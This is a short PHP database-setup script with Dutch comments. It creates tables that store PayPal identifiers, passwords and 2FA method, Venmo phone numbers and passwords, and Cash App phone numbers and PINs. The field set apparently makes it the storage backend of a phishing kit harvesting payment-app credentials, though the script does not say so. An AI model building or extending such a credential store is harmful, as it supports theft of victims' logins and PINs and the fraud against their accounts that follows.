<?php
require_once('db_connect.php');

// Maak of update paypal_flow
$paypal_sql = "CREATE TABLE IF NOT EXISTS paypal_flow (
    id INT AUTO_INCREMENT PRIMARY KEY,
    identifier VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$conn->query($paypal_sql);

// Voeg kolom twofa_method toe indien die nog niet bestaat
$check_column = $conn->query("SHOW COLUMNS FROM paypal_flow LIKE 'twofa_method'");
if ($check_column->num_rows == 0) {
    $conn->query("ALTER TABLE paypal_flow ADD COLUMN twofa_method VARCHAR(255)");
}

// Maak venmo_data
$venmo_sql = "CREATE TABLE IF NOT EXISTS venmo_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    phone_number VARCHAR(20) NOT NULL,
    password VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$conn->query($venmo_sql);

// Maak cashapp_data
$cashapp_sql = "CREATE TABLE IF NOT EXISTS cashapp_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    phone_number VARCHAR(20) NOT NULL,
    pin VARCHAR(10),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$conn->query($cashapp_sql);

echo "Tabellen gecontroleerd en kolommen bijgewerkt.";

$conn->close();
?>
